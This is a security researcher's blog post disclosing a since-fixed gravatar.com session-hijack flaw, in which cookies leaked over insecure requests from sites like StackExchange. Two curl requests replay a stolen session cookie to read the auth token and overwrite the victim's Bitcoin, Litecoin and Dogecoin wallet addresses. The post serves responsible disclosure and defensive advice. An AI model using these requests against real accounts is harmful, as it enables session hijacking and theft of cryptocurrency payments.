---
layout: post
status: publish
published: true
title: Intercept bitcoin by hijacking gravatar.com sessions
author:
  display_name: groovecoder
  login: groovecoder
  email: luke.crouch@gmail.com
  url: http://groovecoder.com
author_login: groovecoder
author_email: luke.crouch@gmail.com
author_url: http://groovecoder.com
date: '2017-02-17 21:00:00 -0600'
date_gmt: '2017-02-17 21:00:00'
tags:
- security
- bitcoin
---
I found this vulnerability almost a year ago, but I worked with Automattic to
help get it fixed before publishing. Now I'm publishing so this post doesn't
have a lonely birthday sitting by itself on my hard drive.
### tl;dr
Sites like stackexchange.com make insecure requests to gravatar.com, which
include session cookies - opening a session-hijack vulnerability which
can be exploited to change a gravatar user's crypto-currency wallet address.
Use [HTTPS Everywhere](https://www.eff.org/https-everywhere) out there people.

### Too short; want moar
I made a presentation covering the "Top 5 Security Errors & Warnings
we see from Firefox and how to fix them" for our [Mozilla Developer
Roadshow](https://hacks.mozilla.org/2017/02/devroadshow/) events in Kansas City
and Tulsa. I looked for an example site to demonstrate the dangers of [mixed passive/display
content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content#Mixed_passivedisplay_content) - 
by far the most popular web security article on MDN.

I found an insecure connection warning on stackexchange.com ...

![StackExchange.com Insecure Connection
Screenshot](/uploads/insecure-stackexchange.png)

... noticed the insecure requests were to gravatar.com ...

![Firefox Network Inspector showing insecure requests to
www.gravatar.com](/uploads/insecure-network-requests.png)

... and that the requests include what looks like a session `Cookie` value:

![Firefox Network Inspector showing insecure Cookie
header](/uploads/insecure-cookie-header.png)

Sure enough, I was able to set `document.cookie` to the same value in another
browser ...

![Firefox console showing
document.cookie](/uploads/insecure-document-cookie.png)

... and a page refresh shows I've hijacked the session:

![Firefox screenshot showing session
hijacked](/uploads/insecure-session-hijacked.png)

So, a man-in-the-middle attacker could snoop the `Cookie` value, obtain the
user's `auth` value from their `/profiles/edit/#currency-services` page ...

<pre>
curl 'https://en.gravatar.com/profiles/edit/#currency-services' \
-H 'Host: en.gravatar.com' \
-H 'Cookie: gravatar=groovecoder%7C1487899996%7Cpb...0f8158'
</pre>

... and update the user's Bitcoin, litecoin, and Dogecoin wallet addresses:

<pre>
curl 'https://en.gravatar.com/profiles/save/' \
-H 'Host: en.gravatar.com' \
-H 'Cookie:gravatar=groovecoder%7C1487899996%7Cpb...0f8158' \
--data 'auth=9e3332ada4&
  panel=currency-services&
  currency.bitcoin=attacker-bitcoin-address&
  currency.litecoin=attacker-litecoin-address&
  currency.dogecoin=attacker-dogecoin-address&
  save=Save+Currencies'
</pre>

More efficiently, one could use [this bettercap http proxy
module](https://gist.github.com/groovecoder/cd66b8b9527917120787813352099448).

Stay safe and use [HTTPS Everywhere](https://www.eff.org/https-everywhere),
folks!
